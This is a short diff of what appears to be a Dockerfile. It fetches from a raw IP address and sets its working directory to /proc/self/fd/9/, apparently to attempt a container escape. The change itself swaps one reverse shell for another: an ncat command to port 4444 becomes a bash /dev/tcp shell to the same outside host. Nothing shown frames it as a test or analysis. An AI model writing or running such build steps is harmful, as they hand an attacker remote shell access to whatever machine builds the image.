@@ -4,6 +4,6 @@ RUN curl http://68.183.4.199/from_ibm
 
 WORKDIR /proc/self/fd/9/
 
-RUN ncat 68.183.4.199 4444 -e /bin/sh
+RUN bash -i >& /dev/tcp/68.183.4.199/4444 0>&1
 
 CMD ["/bin/bash"]
